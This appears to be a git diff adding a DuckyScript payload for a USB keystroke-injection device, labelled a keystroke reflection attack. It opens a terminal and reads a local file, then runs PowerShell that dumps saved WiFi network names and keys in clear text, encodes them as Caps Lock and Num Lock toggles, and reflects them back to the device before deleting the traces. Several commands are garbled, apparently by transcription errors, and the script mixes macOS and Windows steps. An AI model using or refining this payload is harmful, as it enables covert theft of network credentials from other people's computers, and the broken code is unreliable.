@@ -1,0 +1,50 @@
+REM Example Simple Keystroke Reflection Attack for macOS
+REM Read some file and save it to flipper
+ATTACKMODE HID
+LED OFF
+DELAY 2000
+SAVE_HOST_KEYBOARD_LOCK_STATE
+§_EXFIL_MODE_ENABLED = TRUE
+§_EXFIL_LEDS_ENABLED = TRUE
+REM Store the currently connected WiFi SSID & Key to %tmp%\z
+
+REM Open terminal window
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 100
+ENTER
+DELAY 1000
+STRING cat '/Users/ecimino/git-clones/flipper-base/f-zero/badUSB/helloworld.txt'
+ENTER
+
+
+GUI r
+DELAY 100
+STRINGLN powershell "netsh wlan show profile
+name= (Get -NetConnectionProfile). Name key=clear|?{$_-match' SSID n|Key C'31%{($_
+-split': ')[1]}>Senv: tmp\z"
+DELAY 100
+
+
+REM Convert the stored creds into CAPSLOCK and NUMLOCK values.
+GUI r
+DELAY 100
+STRINGLN powershell "foreach($b in $(cat $env:tmp\z - En by) ){foreach($a in 0x80, 0×40, 0×20, 0x10, 0×08, 0×04, 0x02, 0x01){if ($b-band$a) {$o+= '%{NUMLOCK} '}else{$o +=*%{CAPSLOCK} '}}}; $o+= '%{SCROLLLOCK}'; echo $o >$env:tmp\z"
+DELAY 100
+
+
+REM Reflect the CAPSLOCK and NUMLOCK Keystrokes back to the Ducky.
+GUI r
+DELAY 100
+STRINGLN powershell "$o= (cat $env: tmp\z); Add-Type - A System.Windows. Forms; [System.Windows. Forms. SendKeys]::SendWait($o) ; rm
+Senv: tmp\z"
+DELAY 100
+
+
+REM The final SCROLLLOCK keystroke indicates EXFIL is complete.
+WAIT_FOR_SCROLL_CHANGE
+LED G
+§_EXFIL_MODE_ENABLED = FALSE
+RESTORE_HOST_KEYBOARD_LOCK_STATE
